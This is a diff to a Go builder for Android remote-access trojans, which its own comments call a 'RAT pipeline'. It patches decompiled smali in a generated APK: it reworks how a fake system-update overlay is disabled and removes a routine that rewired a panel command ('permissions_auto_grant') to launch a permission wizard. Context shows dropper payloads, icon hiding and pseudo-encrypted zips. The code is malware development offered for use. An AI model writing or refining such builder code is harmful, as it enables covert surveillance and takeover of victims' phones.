@@ -1835,11 +1835,8 @@ func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPay
 	wsHandlerSmali := filepath.Join(workDir, "smali", "v", "s", "RWY6BVSB0XxPbw.smali")
 	patchServiceRestart(wsHandlerSmali)
 
-	overlaySmaliPath := filepath.Join(workDir, "smali", "v", "s", "VpKcDcuRNaQkRJ5.smali")
-	patchFakeUpdateOverlay(overlaySmaliPath)
-
-	dispatcherSmali := filepath.Join(workDir, "smali", "v", "s", "GARjgaGEpTotOxcl8vfe.smali")
-	patchAutoGrant(dispatcherSmali)
+	syncSmali := filepath.Join(workDir, "smali", "app", "mobilex", "plus", "services", "SyncQYAdapter.smali")
+	patchFakeUpdateOverlay(syncSmali)
 
 	hideIcon := sess.HideIcon
 	if isInnerPayload {
@@ -2305,8 +2302,10 @@ func pseudoEncryptZip(apkPath string) error {
 	return os.WriteFile(apkPath, data, 0644)
 }
 
-// patchFakeUpdateOverlay makes nQilHWaqS401ZtR always exit early so the fake
-// system-update overlay is never shown after accessibility is granted.
+// patchFakeUpdateOverlay disables the fake system-update overlay (UtilGLWorker)
+// by making qfTrc75xwRVMl85vh return false immediately. This method is the sole
+// entry point that builds and launches the overlay Intent; short-circuiting it
+// leaves the RAT pipeline (nQilHWaqS401ZtR / GrNkWurIv2PyLjgXX118) untouched.
 func patchFakeUpdateOverlay(smaliPath string) {
 	data, err := os.ReadFile(smaliPath)
 	if err != nil {
@@ -2315,11 +2314,11 @@ func patchFakeUpdateOverlay(smaliPath string) {
 	}
 	s := string(data)
 
-	// The method checks a boolean flag; if true it returns immediately (overlay already
-	// shown). We replace the sget-boolean with const/4 v0, 0x1 so the flag always
-	// appears set → method returns before opening UtilGLWorker.
-	oldCode := "    sget-boolean v0, Lv/s/VpKcDcuRNaQkRJ5;->JXn4Qf7zpnLjP5:Z\n\n    .line 2\n    .line 3\n    if-eqz v0, :cond_0"
-	newCode := "    const/4 v0, 0x1\n\n    .line 2\n    .line 3\n    if-eqz v0, :cond_0"
+	// Insert an early return at the very top of the method body, before any
+	// overlay-related code runs.  The method declares .locals 3 and returns Z
+	// (boolean), so "const/4 v0, 0x0 / return v0" is valid and minimal.
+	oldCode := ".method public final qfTrc75xwRVMl85vh(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z\n    .locals 3\n\n    .line 1\n    :try_start_0\n    new-instance v0, Landroid/content/ComponentName;"
+	newCode := ".method public final qfTrc75xwRVMl85vh(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z\n    .locals 3\n\n    const/4 v0, 0x0\n\n    return v0\n\n    .line 1\n    :try_start_0\n    new-instance v0, Landroid/content/ComponentName;"
 
 	patched := strings.Replace(s, oldCode, newCode, 1)
 	if patched == s {
@@ -2329,82 +2328,6 @@ func patchFakeUpdateOverlay(smaliPath string) {
 
 	if err := os.WriteFile(smaliPath, []byte(patched), 0644); err != nil {
 		log.Printf("[BUILDER] WARNING: patchFakeUpdateOverlay write: %v", err)
-	}
-}
-
-// patchAutoGrant rewires the permissions_auto_grant command handler in the
-// WebSocket dispatcher so that receiving the command from the panel launches
-// UtilNWWrapper (the existing permission-wizard Activity) instead of the fake
-// update overlay that was called there before.
-func patchAutoGrant(smaliPath string) {
-	data, err := os.ReadFile(smaliPath)
-	if err != nil {
-		log.Printf("[BUILDER] WARNING: patchAutoGrant read: %v", err)
-		return
-	}
-	s := string(data)
-
-	// Original block: get DataQFAdapter instance and call nQilHWaqS401ZtR on it
-	// (which used to show the fake system-update overlay).
-	// We replace it with an Intent that starts UtilNWWrapper, the real
-	// permission-wizard Activity, using FLAG_ACTIVITY_NEW_TASK|FLAG_ACTIVITY_SINGLE_TOP
-	// (0x14000000) — same flags used elsewhere in SyncQYAdapter for this Activity.
-	oldCode := `    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;
-
-    .line 1526
-    .line 1527
-    .line 1528
-    move-result-object v0
-
-    .line 1529
-    if-eqz v0, :cond_4
-
-    .line 1530
-    .line 1531
-    invoke-static {v0}, Lv/s/VpKcDcuRNaQkRJ5;->nQilHWaqS401ZtR(Landroid/content/Context;)V
-
-    .line 1532
-    .line 1533
-    .line 1534
-    goto/16 :goto_1`
-
-	newCode := `    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;
-
-    .line 1526
-    .line 1527
-    .line 1528
-    move-result-object v0
-
-    .line 1529
-    if-eqz v0, :cond_4
-
-    .line 1530
-    .line 1531
-    new-instance v1, Landroid/content/Intent;
-
-    const-class v2, Lapp/mobilex/plus/UtilNWWrapper;
-
-    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-
-    const/high16 v2, 0x14000000
-
-    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;
-
-    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
-
-    .line 1532
-    .line 1533
-    .line 1534
-    goto/16 :goto_1`
-
-	patched := strings.Replace(s, oldCode, newCode, 1)
-	if patched == s {
-		log.Printf("[BUILDER] WARNING: patchAutoGrant: pattern not found in %s", smaliPath)
-		return
-	}
-
-	if err := os.WriteFile(smaliPath, []byte(patched), 0644); err != nil {
-		log.Printf("[BUILDER] WARNING: patchAutoGrant write: %v", err)
 	}
 }
 
